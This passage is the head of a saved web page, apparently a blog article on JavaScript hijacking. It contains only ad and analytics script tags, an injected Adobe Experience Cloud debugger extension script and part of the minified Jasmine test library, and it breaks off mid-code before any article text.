<!DOCTYPE html>
<!-- saved from url=(0060)https://www.cnblogs.com/hyddd/archive/2009/07/02/1515768.htm -->
<html lang="zh-cn"><script src="./20190721JSHijacking_files/amp4ads-host-v0.js.下载"></script><script src="./20190721JSHijacking_files/pubads_impl_rendering_2019070801.js.下载"></script><script type="text/javascript" async="" src="./20190721JSHijacking_files/ga.js.下载"></script><script async="" src="./20190721JSHijacking_files/analytics.js.下载"></script><script>!function(){var a,b,c,d,e=window,f="adobe.experienceCloud.debugger",g={};a={getSummary:{},getDTMSwitchInformation:{},setDebug:{},useStagingLibrary:{},getLaunchSwitchInformation:{},setLaunchDebug:{},targetMboxHighlightOn:{},targetMboxHighlightOff:{},retrieveMCData:{},executeAuditorTests:{}},b={getPerformance:{}},c={blockDTM:{},replaceDtmEmbedCode:{},insertLaunchEmbedCode:{},replaceLaunchEmbedCode:{},enableTargetMboxTraces:{},enableTargetMboxDisable:{},enableTargetMboxDebug:{},getTargetToken:{},connectToDebugger:{},disconnectFromDebugger:{}},d={},g.pageScript=a,g.contentScript=b,g.backgroundScript=c,g.appScript=d,e[f]={},e[f].api=g}();!function(){function a(){return!(!m._satellite||!m._satellite._container)}function b(){return!(!m._satellite||!m._satellite.configurationSettings)}function c(){var a=[];if(!m._satellite||!m._satellite._container||!m._satellite._container.extensions)return a;var b=m._satellite._container.extensions;for(var c in b){var d=b[c];d&&d.displayName&&a.push({name:c,displayName:d.displayName,hostedLibFilesBaseUrl:d.hostedLibFilesBaseUrl})}return a.sort(function(a,b){return a.displayName>b.displayName}),a}var d,e,f,g,h,i,j,k,l,m=window,n=document,o="adobe.experienceCloud.debugger",p=o+".pageScript",q=o+".contentScript",r=o+".backgroundScript",s=o+".appScript",t=p,u=Math.floor(1+1e5*Math.random())+""+(new Date).getTime(),v=p+"."+u,w={contentScript:{to:q},backgroundScript:{to:r},appScript:{to:s}},x=m[o].api,y={},z=1,A={},B={_count:0,_handled:{},_listeners:{},on:function(a,b){B._listeners[a]||(B._listeners[a]=[]),B._listeners[a].push(b)},off:function(a,b){var c,d,e=!1;if(B._listeners[a])for(c=0,d=B._listeners[a].length;c<d;c++)if(B._listeners[a][c]===b){B._listeners[a].splice(c,1),e=!0;break}return e},handle:function(a,b,c){var d,e,f,g=!1;if(B._handled[c])return g;if(B._listeners[a])for(d=0,e=B._listeners[a].length;d<e;d++){f=B._listeners[a][d];try{f(b),g=!0}catch(a){}}else g=!0;return B._handled[c]=!0,g},trigger:function(a,b){var c;c=v+"."+ ++B._count,B.handle(a,b,c),i({name:a,data:b,from:v,eventId:c})}},C=o,D={getItem:function(a,b,c){var d;a=a||C,c=c||"_";try{d=JSON.parse(localStorage.getItem(a+c+b))}catch(a){d=null}return d},setItem:function(a,b,c,d){a=a||C,d=d||"_";try{return localStorage.setItem(a+d+b,JSON.stringify(c))}catch(a){return void console.log(a)}},removeItem:function(a,b,c){a=a||C,c=c||"_";try{return localStorage.removeItem(a+c+b)}catch(a){return void console.log(a)}},removeItems:function(a){var b;a=a||C;for(b in localStorage)0===b.indexOf(a)&&localStorage.removeItem(b)}},E=o+"DTMInitHook";m[o].events=B,h=function(a){a.to!==q&&a.to!==r&&a.to!==s||(a.source=p,m.postMessage(a,"*"))},i=function(a){a.from!==q&&(a.source=p,m.postMessage(a,"*"))},j=function(a,b,c){return function(b){return new Promise(function(d,e){var f={name:a,from:t,to:c.to,pageScriptCallbackId:++z};b&&(f.data=b),A[z]=function(a){d(a)},h(f)})}},k=function(a,b,c){var d;a.to===t?a.pageScriptCallbackId?(d=A[a.pageScriptCallbackId],d&&d(a.data),delete A[a.pageScriptCallbackId]):a.name&&y.pageScript[a.name]&&y.pageScript[a.name](a.data).then(function(b){var c=a.from,d=a.to;a.to=c,a.from=d,a.data=b,h(a)}):a.to===q||a.to===r||a.to===s?h(a):a.name&&a.eventId&&B.handle(a.name,a.data,a.eventId)&&i(a)};for(d in w)if(w.hasOwnProperty(d)){e=w[d],y[d]={};for(g in x[d])x[d].hasOwnProperty(g)&&(f=x[d][g],y[d][g]=j(g,f,e))}y.pageScript={getSummary:function(){var d,e,f,g,h,i,j,k,l,n,p,q={analytics:{instances:[]},target:{instances:[]},audienceManager:{instances:[]},mediaOptimizer:{},visitorService:{instances:[]},dtm:{},launch:{},cookies:[]},r={};if(m.s_c_il)for(d=0,e=m.s_c_il.length;d<e;d++)l=m.s_c_il[d],r[l._c]||(r[l._c]=[]),r[l._c].push(l);if(m.s_c_il)for(d=0,e=m.s_c_il.length;d<e;d++)if(l=m.s_c_il[d],n={},"s_c"===l._c){if(n.version=l.version,n.version&&(n.library=0===l.version.indexOf("H")||0===l.version.indexOf("G")?"s_code":"AppMeasurement"),l.visitor&&(n.visitorVersion=l.visitor.version),n.instanceNumber=l._in,n.account=l.account||l.oun||l.un||"",n.pageName=l.pageName||"",n.modules={},r.s_m)for(h in l)for(f=0,g=r.s_m.length;f<g;f++)p=r.s_m[f],l[h]===p&&(n.modules[h]={name:"AppMeasurement_Module_"+h,instanceNumber:p._in});q.analytics.instances.push(n)}else"s_m"===l._c||("Visitor"===l._c?(n.version=l.version,n.instanceNumber=l._in,n.marketingCloudOrgID=l.marketingCloudOrgID||l.namespace,q.visitorService.instances.push(n)):"s_l"===l._c||l._c);if(n={},m.mboxVersion){if(n.library="mbox.js",n.version=m.mboxVersion,m.TNT)for(h in m.TNT){for(i in m.TNT[h])if(m.TNT[h][i].hasOwnProperty("clientCode")&&(k=m.TNT[h][i],n.clientCode=k.clientCode,n.globalMboxName=k.globalMboxName,j=!0),j)break;if(j)break}q.target.library=n}else m.adobe&&m.adobe.target&&(n.library="at.js",n.version=m.adobe.target.VERSION,parseInt(m.adobe.target.VERSION)<2&&m.adobe.target.registerExtension&&m.adobe.target.registerExtension({name:o,modules:["settings"],register:function(a){n.clientCode=a.clientCode,n.globalMboxName=a.globalMboxName}}),2===parseInt(m.adobe.target.VERSION)&&m.___target_traces&&m.___target_traces.settings&&(n.clientCode=m.___target_traces.settings.clientCode,n.pageLoadEnabled=m.___target_traces.settings.pageLoadEnabled,n.viewsEnabled=m.___target_traces.settings.viewsEnabled),q.target.library=n);if(m.ttMETA&&(q.target.instances=m.ttMETA),m.DIL&&m.DIL.dils)for(h in m.DIL.dils)0!==h.indexOf("error")&&(l=m.DIL.dils[h],j={partner:!1},n={},n.version=m.DIL.version,l.api&&(l.api.getState&&(k=l.api.getState())&&k.initConfig&&(j.partner=!0,n.partner=k.initConfig.partner,k.initConfig.uuidCookie&&l.helpers&&l.helpers.getCookie&&(n.uuid=l.helpers.getCookie(k.initConfig.uuidCookie.name||"aam_did"))),!j.partner&&l.api.getPartner&&(n.partner=l.api.getPartner()),n.uuid||l.helpers&&l.helpers.getCookie&&(n.uuid=l.helpers.getCookie("aam_did")),n.uuid||(n.uuid="(unavailable)")),q.audienceManager.instances.push(n));return m._satellite&&(b()?(n={},k=m._satellite.configurationSettings,n.version=k.appVersion,n.buildDate=k.buildDate,n.isStaging=k.settings.isStaging,n.libraryName=k.settings.libraryName,n.scriptDir=k.settings.scriptDir,q.dtm.library=n):a()&&(n={},k=m._satellite._container.buildInfo,n.version=k.turbineVersion,n.buildDate=k.buildDate,n.environment=k.environment,k=m._satellite._container.property,n.name=k.name,q.launch.library=n,q.launch.extensions=c())),Promise.resolve(q)},analyzeSatelliteLib:function(){return new Promise(function(a,b){document.querySelector("script[src*=satelliteLib]")})},getLaunchSwitchInformation:function(){var a={};return a.hasLaunch=!!m._satellite&&!!m._satellite._container,a.hasLaunch?a.debug=D.getItem("com.adobe.reactor","debug","."):a.debug=!1,Promise.resolve(a)},setLaunchDebug:function(a){return m._satellite&&(a&&a.debug?D.setItem("com.adobe.reactor","debug",!0,"."):(D.setItem("com.adobe.reactor","debug",!1,"."),D.removeItem("com.adobe.reactor","debug",".")),m.location.reload(!0)),Promise.resolve(!0)},getDTMSwitchInformation:function(){var a={};return a.hasDTM=!!m._satellite&&!!m._satellite.configurationSettings,a.hasDTM?(a.debug=D.getItem("sdsat","debug"),a.stagingLibrary=D.getItem("sdsat","stagingLibrary")):(a.debug=!1,a.stagingLibrary=!1),Promise.resolve(a)},setDebug:function(a){return m._satellite&&(a&&a.debug?D.setItem("sdsat","debug",!0):(D.setItem("sdsat","debug",!1),D.removeItem("sdsat","debug")),m.location.reload(!0)),Promise.resolve(!0)},useStagingLibrary:function(a){var b="stagingLibrary";return m._satellite&&(a&&a.stagingLibrary?D.setItem("sdsat",b,!0):(D.setItem("sdsat",b,!1),D.removeItem("sdsat",b)),m.location.reload(!0)),Promise.resolve(!0)},targetMboxHighlightOn:function(){var a,b,c,d,e,f,g,h,i,j,k,l,p,q,r,s,t,u,v;if(m.mboxFactoryDefault)m.mboxFactoryDefault.getMboxes&&(a=m.mboxFactoryDefault.getMboxes(),a.each(function(a){var c;if(l="",j=!1,b=a.getName(),d=a.getDiv(),e=d.innerHTML,f=d.id.match("Impo")?"mbox":"mbox-Offer",h="mbox"===f,p="default",g=decodeURI(a.getURL()),q=e.split("&").join("&amp;").split("<").join("&lt;").split(">").join("&gt;").split('"').join("&quot;").split(" ").join("&nbsp;").split("&lt;!--").join("<br><br>&lt;!--").split("--&gt;").join("--&gt;<br>"),b&&m.ttMETA)for(u=0,v=m.ttMETA.length;u<v;u++)if(i=m.ttMETA[u],i.mbox===b){j=i;break}if(j)for(c in j)j.hasOwnProperty(c)&&(l+=c+": "+j[c]+"</br>");else l+="mbox: "+b;d.innerHTML='<h2 class="'+o+'.mboxHighlight" style="border: 2px  solid  red;boxShadow: 10px  10px  5px  #888;minHeight: 20px;position: relative;cursor: pointer;color: red!important;z-index: 9999;" >'+l+"</h2>"+e}));else for(c=n.querySelectorAll('div[class*="mbox-name"]'),s=0,t=c.length;s<t;s++){for(l="",j=!1,d=c[s],e=d.innerHTML,q=e.split("&").join("&amp;").split("<").join("&lt;").split(">").join("&gt;").split('"').join("&quot;").split(" ").join("&nbsp;").split("&lt;!--").join("<br><br>&lt;!--").split("--&gt;").join("--&gt;<br>"),k=d.className.split(" "),u=0,v=k.length;u<v;u++)-1!==k[u].indexOf("mbox-name-")&&(b=k[u].replace("mbox-name-",""));if(b&&m.ttMETA)for(u=0,v=m.ttMETA.length;u<v;u++)if(i=m.ttMETA[u],i.mbox===b){j=i;break}if(j)for(r in j)j.hasOwnProperty(r)&&(l+=r+": "+j[r]+"</br>");else l+="mbox: "+b;d.innerHTML='<h2 class="'+o+'.mboxHighlight" style="border: 2px  solid  red;boxShadow: 10px  10px  5px  #888;minHeight: 20px;position: relative;cursor: pointer;color: red!important;z-index: 9999;" >'+l+"</h2>"+e}return Promise.resolve(!0)},targetMboxHighlightOff:function(){var a,b,c=n.getElementsByClassName(o+".mboxHighlight");for(b=c.length-1;b>=0;b--)a=c[b],a.parentNode.removeChild(a);return Promise.resolve(!0)},retrieveMCData:function(){function a(a){return a&&a[i]&&a[u]&&a[u].length>0}function b(a){return{imsOrgId:a[t],enabled:!1}}function c(a){var c={};return a[u].map(function(a){return a[l]}).filter(function(a){return a[m]===n}).filter(function(a){return a[q]===r}).forEach(function(a){c[a[v]]=b(a)}),c}function d(b){if(!a(b))return{success:!1,message:"Could not get Experience Cloud account details"};var d=c(b);return console.log("products",d),{success:!0,payload:{displayName:b[j],accessToken:b[i],products:d}}}function e(a){console.log("IMS Ajax response",a);var b=d(a);console.log(b);var c={name:o+".token.mc",to:s,from:p,data:b,source:p};console.log(c),h(c)}function f(a,b){var c=new Promise(function(a,c){var d=setTimeout(function(){clearTimeout(d),c("Timed out in "+b+" ms.")},b)});return Promise.race([a,c])}function g(a,b){console.log("Unexpected error",a,b);var c={name:o+".target.errorToken",to:s,from:p,data:b.message,source:p};h(c)}var i="access_token",j="displayName",k="https://adobeid-na1.services.adobe.com/ims/check/v1/token?client_id=MarketingCloud11&scope=additional_info.projectedProductContext,openid,read_organizations",l="prodCtx",m="statusCode",n="ACTIVE",q="serviceCode",r="dma_bullseye",t="owningEntity",u="projectedProductContext",v="client_code";return function(){f(window.fetch(k,{credentials:"include",mode:"cors"}).then(function(a){return a.json()}),1e4).then(e,g)}(),Promise.resolve({})},executeAuditorTests:function(){return console.log("Trying to executeTests"),new Promise(function(a,b){"function"==typeof adobeExperienceCloudDebuggerAuditorTestsExecutor?adobeExperienceCloudDebuggerAuditorTestsExecutor(function(b){a(b)}):b("Unable to run auditor tests...tests not found")})}},m.addEventListener("message",function(a){var b=a.data;a.source===m&&b&&b.source&&b.source===q&&(delete b.source,k(b))},!1),m._satellite=m._satellite||{notify:function(){},track:function(){},getVar:function(){},setVar:function(){},getVisitorId:function(){return null},setCookie:function(){},readCookie:function(){},removeCookie:function(){},isLinked:function(){},pageBottom:function(){}},m._satellite.override=m._satellite.override||{},l=function(){var a,b=m._satellite;b.Logger.keepLimit=9999,a=b.notify,b.notify=function(b,c){var d=["log","log","log","info","warn","error"],e={solution:"dtm",solutions:["dtm"],level:d[c],message:""};a(b,c),e.level=e.level||"log",b&&"string"==typeof b&&(e.message=b,-1!==b.indexOf("Adobe Analytics:")?e.solutions.push("analytics"):-1!==b.indexOf("Test & Target:")?e.solutions.push("target"):-1!==b.indexOf("Visitor ID:")?e.solutions.push("visitorService"):-1!==b.indexOf("AdLens:")&&e.solutions.push("mediaOptimizer")),B.trigger("log",e)}},function(a){function b(b){if(a&&a[b]&&"function"==typeof a[b]){var c=a[b];a[b]=function(){var d=Array.prototype.slice.call(arguments);c.apply(a,d);var e=d.join(" ");if("string"==typeof e&&0===e.indexOf("🚀")){var f={solution:"launch",solutions:["launch"],level:b,message:e};-1!==e.indexOf("[Adobe Analytics]")?f.solutions.push("analytics"):-1!==e.indexOf("[Adobe Target]")?f.solutions.push("target"):-1!==e.indexOf("[Experience Cloud ID Service]")?f.solutions.push("visitorService"):-1!==e.indexOf("[Adobe Media Optimizer]")&&f.solutions.push("mediaOptimizer"),B.trigger("log",f)}}}}["error","info","log","warn"].forEach(b)}(window.console),m.Object&&m.Object.defineProperty&&m.Object.defineProperty(m._satellite.override,E,{enumerable:!0,get:function(){return l(),""},set:function(){}}),window.addEventListener("load",function(){b()||a()||delete m._satellite}),window.___target_traces=window.___target_traces||[];var F=window.___target_traces.push;window.___target_traces.push=function(a){h({name:o+".target.traces",to:s,from:p,data:a}),F.call(this,a)}}();function adobeExperienceCloudDebuggerAuditorTestsExecutor(callback){function _getTestDefinitionById(a){for(var b=rubric.category_test_groups,c=0;c<b.length;c++)for(var d=b[c],e=0;e<d.category_tests.length;e++){var f=d.category_tests[e];if(f.id===a)return f}}function extend(a,b){for(var c in b)a[c]=b[c];return a}function runSpecs(){jasmine.getEnv().execute(),console.log(JSON.stringify(finalReport))}var getJasmineRequireObj=function(a){function b(){return c}var c;return"undefined"!=typeof module&&module.exports&&"undefined"!=typeof exports?(a="undefined"!=typeof global?global:{},c=exports):("undefined"!=typeof window&&"function"==typeof window.toString&&"[object GjsGlobal]"===window.toString()&&(a=window),c=a.jasmineRequire={}),b().core=function(b){var c={};return b.base(c,a),c.util=b.util(c),c.errors=b.errors(),c.formatErrorMsg=b.formatErrorMsg(),c.Any=b.Any(c),c.Anything=b.Anything(c),c.CallTracker=b.CallTracker(c),c.MockDate=b.MockDate(),c.getClearStack=b.clearStack(c),c.Clock=b.Clock(),c.DelayedFunctionScheduler=b.DelayedFunctionScheduler(c),c.Env=b.Env(c),c.StackTrace=b.StackTrace(c),c.ExceptionFormatter=b.ExceptionFormatter(c),c.ExpectationFilterChain=b.ExpectationFilterChain(),c.Expector=b.Expector(c),c.Expectation=b.Expectation(c),c.buildExpectationResult=b.buildExpectationResult(),c.JsApiReporter=b.JsApiReporter(),c.matchersUtil=b.matchersUtil(c),c.ObjectContaining=b.ObjectContaining(c),c.ArrayContaining=b.ArrayContaining(c),c.ArrayWithExactContents=b.ArrayWithExactContents(c),c.pp=b.pp(c),c.QueueRunner=b.QueueRunner(c),c.ReportDispatcher=b.ReportDispatcher(c),c.Spec=b.Spec(c),c.Spy=b.Spy(c),c.SpyFactory=b.SpyFactory(c),c.SpyRegistry=b.SpyRegistry(c),c.SpyStrategy=b.SpyStrategy(c),c.StringMatching=b.StringMatching(c),c.UserContext=b.UserContext(c),c.Suite=b.Suite(c),c.Timer=b.Timer(),c.TreeProcessor=b.TreeProcessor(),c.version=b.version(),c.Order=b.Order(),c.DiffBuilder=b.DiffBuilder(c),c.NullDiffBuilder=b.NullDiffBuilder(c),c.ObjectPath=b.ObjectPath(c),c.GlobalErrors=b.GlobalErrors(c),c.Truthy=b.Truthy(c),c.Falsy=b.Falsy(c),c.Empty=b.Empty(c),c.NotEmpty=b.NotEmpty(c),c.matchers=b.requireMatchers(b,c),c.asyncMatchers=b.requireAsyncMatchers(b,c),c},b}(this);getJasmineRequireObj().requireMatchers=function(a,b){for(var c=["nothing","toBe","toBeCloseTo","toBeDefined","toBeFalsy","toBeGreaterThan","toBeGreaterThanOrEqual","toBeLessThan","toBeLessThanOrEqual","toBeNaN","toBeNegativeInfinity","toBeNull","toBePositiveInfinity","toBeTruthy","toBeUndefined","toContain","toEqual","toHaveBeenCalled","toHaveBeenCalledBefore","toHaveBeenCalledTimes","toHaveBeenCalledWith","toHaveClass","toMatch","toThrow","toThrowError","toThrowMatching"],d={},e=0;e<c.length;e++){var f=c[e];d[f]=a[f](b)}return d},getJasmineRequireObj().base=function(a,b){a.unimplementedMethod_=function(){throw new Error("unimplemented method")},a.MAX_PRETTY_PRINT_DEPTH=8,a.MAX_PRETTY_PRINT_ARRAY_LENGTH=50,a.MAX_PRETTY_PRINT_CHARS=1e3,a.DEFAULT_TIMEOUT_INTERVAL=5e3,a.getGlobal=function(){return b},a.getEnv=function(b){return a.currentEnv_=a.currentEnv_||new a.Env(b)},a.isArray_=function(b){return a.isA_("Array",b)},a.isObject_=function(b){return!a.util.isUndefined(b)&&null!==b&&a.isA_("Object",b)},a.isString_=function(b){return a.isA_("String",b)},a.isNumber_=function(b){return a.isA_("Number",b)},a.isFunction_=function(b){return a.isA_("Function",b)},a.isAsyncFunction_=function(b){return a.isA_("AsyncFunction",b)},a.isTypedArray_=function(b){return a.isA_("Float32Array",b)||a.isA_("Float64Array",b)||a.isA_("Int16Array",b)||a.isA_("Int32Array",b)||a.isA_("Int8Array",b)||a.isA_("Uint16Array",b)||a.isA_("Uint32Array",b)||a.isA_("Uint8Array",b)||a.isA_("Uint8ClampedArray",b)},a.isA_=function(b,c){return a.getType_(c)==="[object "+b+"]"},a.isError_=function(a){return a instanceof Error||!!(a&&a.constructor&&a.constructor.constructor&&a instanceof a.constructor.constructor("return this")().Error)},a.getType_=function(a){return Object.prototype.toString.apply(a)},a.isDomNode=function(a){return void 0!==b.Node?a instanceof b.Node:null!==a&&"object"==typeof a&&"number"==typeof a.nodeType&&"string"==typeof a.nodeName},a.isMap=function(a){return void 0!==b.Map&&a.constructor===b.Map},a.isSet=function(a){return void 0!==b.Set&&a.constructor===b.Set},a.isPromise=function(a){return void 0!==b.Promise&&!!a&&a.constructor===b.Promise},a.isPromiseLike=function(b){return!!b&&a.isFunction_(b.then)},a.fnNameFor=function(a){if(a.name)return a.name;var b=a.toString().match(/^\s*function\s*(\w+)\s*\(/)||a.toString().match(/^\s*\[object\s*(\w+)Constructor\]/);return b?b[1]:"<anonymous>"},a.any=function(b){return new a.Any(b)},a.anything=function(){return new a.Anything},a.truthy=function(){return new a.Truthy},a.falsy=function(){return new a.Falsy},a.empty=function(){return new a.Empty},a.notEmpty=function(){return new a.NotEmpty},a.objectContaining=function(b){return new a.ObjectContaining(b)},a.stringMatching=function(b){return new a.StringMatching(b)},a.arrayContaining=function(b){return new a.ArrayContaining(b)},a.arrayWithExactContents=function(b){return new a.ArrayWithExactContents(b)},a.isSpy=function(b){return!!b&&(b.and instanceof a.SpyStrategy&&b.calls instanceof a.CallTracker)}},getJasmineRequireObj().util=function(a){function b(){return new a.StackTrace(c.errorWithStack()).frames[2].file}var c={};return c.inherit=function(a,b){var c=function(){};c.prototype=b.prototype,a.prototype=new c},c.htmlEscape=function(a){return a?a.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;"):a},c.argsToArray=function(a){for(var b=[],c=0;c<a.length;c++)b.push(a[c]);return b},c.isUndefined=function(a){return void 0===a},c.arrayContains=function(a,b){for(var c=a.length;c--;)if(a[c]===b)return!0;return!1},c.clone=function(a){if("[object Array]"===Object.prototype.toString.apply(a))return a.slice();var b={};for(var c in a)a.hasOwnProperty(c)&&(b[c]=a[c]);return b},c.cloneArgs=function(b){for(var c=[],d=a.util.argsToArray(b),e=0;e<d.length;e++){var f=Object.prototype.toString.apply(d[e]),g=/^\[object (Boolean|String|RegExp|Number)/;!d[e]||f.match(g)?c.push(d[e]):c.push(a.util.clone(d[e]))}return c},c.getPropertyDescriptor=function(a,b){var c,d=a;do{c=Object.getOwnPropertyDescriptor(d,b),d=Object.getPrototypeOf(d)}while(!c&&d);return c},c.objectDifference=function(a,b){var d={};for(var e in a)c.has(a,e)&&!c.has(b,e)&&(d[e]=a[e]);return d},c.has=function(a,b){return Object.prototype.hasOwnProperty.call(a,b)},c.errorWithStack=function(){var a=new Error;if(a.stack)return a;try{throw new Error}catch(a){return a}},c.jasmineFile=function(){var a;return function(){return a||(a=b()),a}}(),c},getJasmineRequireObj().Spec=function(a){function b(a){this.expectationFactory=a.expectationFactory,this.asyncExpectationFactory=a.asyncExpectationFactory,this.resultCallback=a.resultCallback||function(){},this.id=a.id,this.description=a.description||"",this.queueableFn=a.queueableFn,this.beforeAndAfterFns=a.beforeAndAfterFns||function(){return{befores:[],afters:[]}},this.userContext=a.userContext||function(){return{}},this.onStart=a.onStart||function(){},this.getSpecName=a.getSpecName||function(){return""},this.expectationResultFactory=a.expectationResultFactory||function(){},this.queueRunnerFactory=a.queueRunnerFactory||function(){},this.catchingExceptions=a.catchingExceptions||function(){return!0},this.throwOnExpectationFailure=!!a.throwOnExpectationFailure,this.queueableFn.fn||this.pend(),this.result={id:this.id,description:this.description,fullName:this.getFullName(),failedExpectations:[],passedExpectations:[],deprecationWarnings:[],pendingReason:""}}b.prototype.addExpectationResult=function(b,c,d){var e=this.expectationResultFactory(c);if(b)this.result.passedExpectations.push(e);else if(this.result.failedExpectations.push(e),this.throwOnExpectationFailure&&!d)throw new a.errors.ExpectationFailed},b.prototype.expect=function(a){return this.expectationFactory(a,this)},b.prototype.expectAsync=function(a){return this.asyncExpectationFactory(a,this)},b.prototype.execute=function(b,c){var d=this,e={fn:function(a){d.onStart(d,a)}},f={fn:function(a){d.queueableFn.fn=null,d.result.status=d.status(c),d.resultCallback(d.result,a)}},g=this.beforeAndAfterFns(),h=g.befores.concat(this.queueableFn),i={isLeaf:!0,queueableFns:h,cleanupFns:g.afters,onException:function(){d.onException.apply(d,arguments)},onComplete:function(){b("failed"===d.result.status&&new a.StopExecutionError("spec failed"))},userContext:this.userContext()};(this.markedPending||!0===c)&&(i.queueableFns=[],i.cleanupFns=[]),i.queueableFns.unshift(e),i.cleanupFns.push(f),this.queueRunnerFactory(i)},b.prototype.onException=function(d){if(b.isPendingSpecException(d))return void this.pend(c(d));d instanceof a.errors.ExpectationFailed||this.addExpectationResult(!1,{matcherName:"",passed:!1,expected:"",actual:"",error:d},!0)},b.prototype.pend=function(a){this.markedPending=!0,a&&(this.result.pendingReason=a)},b.prototype.getResult=function(){return this.result.status=this.status(),this.result},b.prototype.status=function(a){return!0===a?"excluded":this.markedPending?"pending":this.result.failedExpectations.length>0?"failed":"passed"},b.prototype.getFullName=function(){return this.getSpecName(this)},b.prototype.addDeprecationWarning=function(a){"string"==typeof a&&(a={message:a}),this.result.deprecationWarnings.push(this.expectationResultFactory(a))};var c=function(a){var c=a.toString(),d=c.indexOf(b.pendingSpecExceptionMessage),e=d+b.pendingSpecExceptionMessage.length;return c.substr(e)};return b.pendingSpecExceptionMessage="=> marked Pending",b.isPendingSpecException=function(a){return!(!a||!a.toString||-1===a.toString().indexOf(b.pendingSpecExceptionMessage))},b},void 0==typeof window&&"object"==typeof exports&&(exports.Spec=jasmineRequire.Spec),getJasmineRequireObj().Order=function(){function a(a){function b(a){return a}function c(a){var b=a.slice();return b.sort(function(a,b){return d(e+a.id)-d(e+b.id)}),b}function d(a){var b,c;for(b=c=0;c<a.length;++c)b+=a.charCodeAt(c),b+=b<<10,b^=b>>6;return b+=b<<3,b^=b>>11,b+=b<<15}this.random=!("random"in a)||a.random;var e=this.seed=a.seed||function(){return String(Math.random()).slice(-5)}();this.sort=this.random?c:b}return a},getJasmineRequireObj().Env=function(a){function b(b){function c(a){var b=t();if(null!==b&&void 0!==b)throw new Error("'"+a+"' should only be used in 'describe' function")}function d(a,b){var c=p;c.addChild(a),p=a;var d=null;try{b.call(a)}catch(a){d=a}d&&a.onException(d),p=c}function e(a){for(;a;){if(a.isFocused)return a.id;a=a.parentSuite}return null}function f(){var a=e(p);if(a)for(var b=0;b<R.length;b++)if(R[b]===a){R.splice(b,1);break}}b=b||{};var g=this,h=b.global||a.getGlobal(),i=0,j=h.setTimeout,k=h.clearTimeout,l=a.getClearStack(h);this.clock=new a.Clock(h,function(){return new a.DelayedFunctionScheduler},new a.MockDate(h));var m={},n=null,o=[],p=null,q=!1,r={random:!0,seed:null,failFast:!1,oneFailurePerSpec:!1,specFilter:function(){return!0},hideDisabled:!1},s=function(){return o[o.length-1]},t=function(){return n||s()},u=null,v=function(){u||(u=new a.GlobalErrors,u.install())};b.suppressLoadErrors||(v(),u.pushListener(function(a,b,c){K.result.failedExpectations.push({passed:!1,globalErrorType:"load",message:a,filename:b,lineno:c})})),this.configure=function(a){a.specFilter&&(r.specFilter=a.specFilter),a.hasOwnProperty("random")&&(r.random=!!a.random),a.hasOwnProperty("seed")&&(r.seed=a.seed),a.hasOwnProperty("failFast")&&(r.failFast=a.failFast),a.hasOwnProperty("oneFailurePerSpec")&&(r.oneFailurePerSpec=a.oneFailurePerSpec),a.hasOwnProperty("hideDisabled")&&(r.hideDisabled=a.hideDisabled)},this.configuration=function(){var a={};for(var b in r)a[b]=r[b];return a},Object.defineProperty(this,"specFilter",{get:function(){return g.deprecated("Getting specFilter directly from Env is deprecated, please check the specFilter option from `configuration`"),r.specFilter},set:function(a){g.deprecated("Setting specFilter directly on Env is deprecated, please use the specFilter option in `configure`"),r.specFilter=a}}),this.addSpyStrategy=function(a,b){if(!t())throw new Error("Custom spy strategies must be added in a before function or a spec");m[t().id].customSpyStrategies[a]=b},this.addCustomEqualityTester=function(a){if(!t())throw new Error("Custom Equalities must be added in a before function or a spec");m[t().id].customEqualityTesters.push(a)},this.addMatchers=function(a){if(!t())throw new Error("Matchers must be added in a before function or a spec");var b=m[t().id].customMatchers;for(var c in a)b[c]=a[c]},a.Expectation.addCoreMatchers(a.matchers),a.Expectation.addAsyncCoreMatchers(a.asyncMatchers);var w=0,x=function(){return"spec"+w++},y=0,z=function(){return"suite"+y++},A=function(b,c){function d(a,b){return c.addExpectationResult(a,b)}return a.Expectation.factory({util:a.matchersUtil,customEqualityTesters:m[c.id].customEqualityTesters,customMatchers:m[c.id].customMatchers,actual:b,addExpectationResult:d})},B=function(b,c){function d(a,b){return c.addExpectationResult(a,b)}return a.Expectation.asyncFactory({util:a.matchersUtil,customEqualityTesters:m[c.id].customEqualityTesters,actual:b,addExpectationResult:d})},C=function(b,c){var d={spies:[],customEqualityTesters:[],customMatchers:{},customSpyStrategies:{}};m[c]&&(d.customEqualityTesters=a.util.clone(m[c].customEqualityTesters),d.customMatchers=a.util.clone(m[c].customMatchers)),m[b]=d},D=function(a){N.clearSpies(),delete m[a]},E=function(a){return function(){for(var b=[],c=[];a;)b=b.concat(a.beforeFns),c=c.concat(a.afterFns),a=a.parentSuite;return{befores:b.reverse(),afters:c}}},F=function(a,b){var c=[a.description],d=b.getFullName();return""!==d&&c.unshift(d),c.join(" ")},G=a.buildExpectationResult,H=new a.ExceptionFormatter,I=function(a){return a.messageFormatter=H.message,a.stackFormatter=H.stack,G(a)};this.throwOnExpectationFailure=function(a){this.deprecated("Setting throwOnExpectationFailure directly on Env is deprecated, please use the oneFailurePerSpec option in `configure`"),this.configure({oneFailurePerSpec:!!a})},this.throwingExpectationFailures=function(){return this.deprecated("Getting throwingExpectationFailures directly from Env is deprecated, please check the oneFailurePerSpec option from `configuration`"),r.oneFailurePerSpec},this.stopOnSpecFailure=function(a){this.deprecated("Setting stopOnSpecFailure directly is deprecated, please use the failFast option in `configure`"),this.configure({failFast:!!a})},this.stoppingOnSpecFailure=function(){return this.deprecated("Getting stoppingOnSpecFailure directly from Env is deprecated, please check the failFast option from `configuration`"),r.failFast},this.randomizeTests=function(a){this.deprecated("Setting randomizeTests directly is deprecated, please use the random option in `configure`"),r.random=!!a},this.randomTests=function(){return this.deprecated("Getting randomTests directly from Env is deprecated, please check the random option from `configuration`"),r.random},this.seed=function(a){return this.deprecated("Setting seed directly is deprecated, please use the seed option in `configure`"),a&&(r.seed=a),r.seed},this.hidingDisabled=function(a){return this.deprecated("Getting hidingDisabled directly from Env is deprecated, please check the hideDisabled option from `configuration`"),r.hideDisabled},this.hideDisabled=function(a){this.deprecated("Setting hideDisabled directly is deprecated, please use the hideDisabled option in `configure`"),r.hideDisabled=!!a},this.deprecated=function(a){(t()||K).addDeprecationWarning(a),"undefined"!=typeof console&&"function"==typeof console.error&&console.error("DEPRECATION:",a)};var J=function(b,c){var 